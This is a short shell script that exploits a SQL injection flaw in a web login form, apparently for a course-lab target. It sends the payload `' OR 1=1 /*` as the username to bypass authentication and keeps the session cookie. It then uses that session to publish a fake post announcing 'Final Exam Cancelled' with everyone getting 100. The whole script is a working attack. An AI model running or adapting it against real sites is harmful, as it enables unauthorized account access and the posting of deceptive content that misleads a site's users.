#!/bin/sh

POST_URL="${1}/post.php"
SQL_INJECTION=$'\' OR 1=1 /*'

echo "Exploiting SQL Injection..."
curl -d "username=${SQL_INJECTION}&password=p&form=login&submit=Login" -c cookies ${POST_URL}
curl -L -b cookies -s ${1} | awk '/Welcome, ([a-z]+)!/ { print $1 " " $2 }' 

echo "\n"

echo "Creating a new post..."
curl -L -b cookies -d "title=Final+Exam+Cancelled&content=Everyone+will+get+100&type=1&form=content&submit=submit" -s ${POST_URL} | grep "Final Exam Cancelled"

echo "\n"
echo "DONE"
